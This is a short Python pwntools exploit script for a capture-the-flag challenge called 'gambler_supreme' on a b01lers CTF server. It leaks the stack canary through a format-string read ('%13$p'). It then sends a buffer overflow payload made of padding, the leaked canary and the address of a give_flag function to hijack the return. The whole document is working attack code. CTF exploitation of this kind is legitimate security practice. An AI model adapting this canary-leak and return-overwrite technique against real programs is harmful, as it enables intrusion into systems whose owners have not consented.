from pwn import *

p = process('./gambler_supreme')
p = remote('ctf.b01lers.com', 9201)

p.recv()
p.sendline(b'7')
p.recv()

# get stack guard
p.sendline(b'%13$p')
p.recvuntil(b'Your guess: ')
guard = int(p.recvline().strip(), 16)
print(f'Guard: {guard:#x}')

# return to give_flag
give_flag_adr = 0x4015ba

payload = b'A'*40
payload += p64(guard)
payload += p64(give_flag_adr)
payload += p64(give_flag_adr)

p.recv()
p.sendline(payload)
print(p.recv().decode())
print(p.recv().decode())
